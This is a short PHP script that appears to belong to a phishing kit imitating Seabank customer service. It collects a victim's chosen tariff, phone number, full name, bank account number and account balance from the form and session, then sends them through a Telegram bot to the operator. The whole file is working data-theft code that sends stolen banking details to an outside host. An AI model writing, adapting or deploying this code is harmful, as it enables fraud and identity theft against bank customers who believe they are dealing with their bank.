<?php
session_start();
include "./telegram.php";

$saldo = $_POST['saldo'];
$_SESSION['saldo'] = $saldo;
$tarif = $_SESSION['tarif'];
$nohp = $_SESSION['nohp'];
$nama = $_SESSION['nama'];
$rek = $_SESSION['rek'];

$message = "
Seabank Menu Pilihan
───────────────────────
• Menu Pilihan : $tarif
• Nomor Handphone : $nohp
• Nama Lengkap : $nama
• Nomor Rekening : $rek
• Saldo Rekening : $saldo
───────────────────────
© Cs Seabank - 2026
";

sendMessage($wahyustr_id, $message, $wahyustr_bot);

?>